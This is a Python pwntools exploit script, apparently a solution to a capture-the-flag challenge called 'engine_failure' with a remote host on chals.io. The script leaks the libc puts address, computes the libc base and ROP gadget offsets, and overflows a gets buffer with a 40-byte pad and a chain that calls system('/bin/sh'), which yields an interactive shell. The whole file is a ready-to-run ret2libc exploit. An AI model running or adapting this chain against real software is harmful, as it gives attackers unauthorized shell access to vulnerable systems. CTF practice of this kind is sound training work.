#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-v']

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

BINARY = './engine_failure.bin_patched'

code = ELF(BINARY)
context.binary = code
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    io=remote("spaceheroes-engine-failure.chals.io",443,ssl=True,sni="spaceheroes-engine-failure.chals.io")
else:
    io = process([code.path])
    gdb.attach(io, gdbscript = '''
                   b main
                   b *vuln+58
                   c
    ''')



p = log.progress("Exploiting")

pad = b"\x41"*40
# Leak libc puts address
payload = b"2"
resp = io.recvuntil("Exit").decode()
io.sendline(payload)
resp = io.recvuntil("Exit").decode()
print(resp)
leaked_puts = int(str("0x" + resp.split("0x")[1].split("\n")[0]), 16)

# actual libc address
libc.address = leaked_puts - libc.symbols["puts"]
# gadgets
libc_system = p64(libc.symbols["system"])
libc_bin_sh = p64(libc.address + 0x001d8698)
libc_ret = p64(libc.address + 0x29cd6)
libc_pop_rdi_ret = p64(libc.address + 0x2a3e5)

# go to the gets instruction
payload = b"1\n1\n" 
# our actual payload to system("/bin/sh")
payload += pad + libc_pop_rdi_ret + libc_bin_sh + libc_ret + libc_system

io.sendline(payload)
io.interactive()
